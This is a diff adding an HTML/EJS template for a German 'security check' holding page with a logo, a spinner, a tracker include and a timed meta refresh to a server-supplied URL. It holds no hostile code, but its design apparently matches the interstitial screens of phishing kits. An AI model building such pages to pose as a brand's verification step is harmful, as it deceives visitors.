@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <%- include('partials/tracker') %>
+    <meta http-equiv="refresh" content="<%=time%>; url=<%=url%>">
+    <title>Sicherheitsprüfung</title>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <style>
+        :root {
+            --page-bg: #FFFFFF;
+            --blue-primary: #003EB0;
+            --blue-accent: #0066FF;
+            --spinner-track: #E8EEF7;
+            --font-stack: Arial, "Helvetica Neue", Helvetica, sans-serif;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            height: 100%;
+            min-height: 100vh;
+            min-height: 100dvh;
+            font-family: var(--font-stack);
+            background-color: var(--page-bg);
+            color: #222222;
+            overflow: hidden;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        /* =========================================================
+           CENTER STAGE: PERFECT HORIZONTAL & VERTICAL CENTERING
+           ========================================================= */
+        .center-stage {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+        }
+
+        .logo-reflection-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: clamp(20px, 2.5vw, 26px);
+            position: relative;
+            background: transparent;
+            border: none;
+            box-shadow: none;
+        }
+
+        /* =========================================================
+           LOGO: INCREASED BY 15%, COMPLETELY STATIC (NO ANIMATIONS)
+           ========================================================= */
+        .logo-wrapper {
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: transparent;
+            border: none;
+            box-shadow: none;
+        }
+
+        /* Center Logo: public/img/bota.png - 15% larger, 100% static */
+        .center-logo {
+            width: clamp(104px, 11.5vw, 135px);
+            height: auto;
+            display: block;
+            object-fit: contain;
+            position: relative;
+            animation: none !important;
+            transform: none !important;
+            transition: none !important;
+        }
+
+        /* =========================================================
+           MODERN SLEEK LOADING INDICATOR
+           ========================================================= */
+        .modern-spinner-container {
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: clamp(34px, 3.8vw, 42px);
+            height: clamp(34px, 3.8vw, 42px);
+            background: transparent;
+            border: none;
+            box-shadow: none;
+        }
+
+        .modern-spinner {
+            width: 100%;
+            height: 100%;
+            animation: modernRotate 1.5s linear infinite;
+            transform-origin: center center;
+        }
+
+        .spinner-track {
+            stroke: var(--spinner-track);
+            stroke-width: 4;
+            opacity: 0.9;
+        }
+
+        .spinner-head {
+            stroke-width: 4;
+            stroke-linecap: round;
+            stroke-dasharray: 1, 150;
+            stroke-dashoffset: 0;
+            animation: modernDash 1.5s ease-in-out infinite;
+            transform-origin: center center;
+        }
+
+        @keyframes modernRotate {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes modernDash {
+            0% {
+                stroke-dasharray: 1, 150;
+                stroke-dashoffset: 0;
+            }
+            50% {
+                stroke-dasharray: 90, 150;
+                stroke-dashoffset: -35;
+            }
+            100% {
+                stroke-dasharray: 90, 150;
+                stroke-dashoffset: -124;
+            }
+        }
+
+        /* =========================================================
+           RESPONSIVE - TABLET & MOBILE
+           ========================================================= */
+        @media (max-width: 768px) {
+            .center-logo {
+                width: clamp(95px, 17.5vw, 123px);
+            }
+
+            .modern-spinner-container {
+                width: clamp(32px, 6vw, 38px);
+                height: clamp(32px, 6vw, 38px);
+            }
+
+            .logo-reflection-container {
+                gap: 20px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .center-logo {
+                width: 99px;
+            }
+
+            .modern-spinner-container {
+                width: 32px;
+                height: 32px;
+            }
+
+            .logo-reflection-container {
+                gap: 18px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <main class="center-stage">
+        <div class="logo-reflection-container" role="status" aria-label="Sicherheitsprüfung wird durchgeführt...">
+            
+            <!-- Static Logo (15% larger, no animation) -->
+            <div class="logo-wrapper">
+                <img src="/img/bota.png" alt="Logo" class="center-logo"
+                    onerror="if(!this.dataset.retry){this.dataset.retry='1';this.src='img/bota.png';}">
+            </div>
+
+            <!-- Modern, Visually Appealing Loading Spinner -->
+            <div class="modern-spinner-container" aria-hidden="true">
+                <svg class="modern-spinner" viewBox="0 0 50 50">
+                    <defs>
+                        <linearGradient id="modernBlueGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" stop-color="#003EB0" />
+                            <stop offset="50%" stop-color="#0056B3" />
+                            <stop offset="100%" stop-color="#1A73E8" />
+                        </linearGradient>
+                    </defs>
+                    <!-- Track Circle -->
+                    <circle class="spinner-track" cx="25" cy="25" r="20" fill="none" />
+                    <!-- Animated Gradient Arc -->
+                    <circle class="spinner-head" cx="25" cy="25" r="20" fill="none" stroke="url(#modernBlueGrad)" />
+                </svg>
+            </div>
+
+        </div>
+    </main>
+
+</body>
+
+</html>
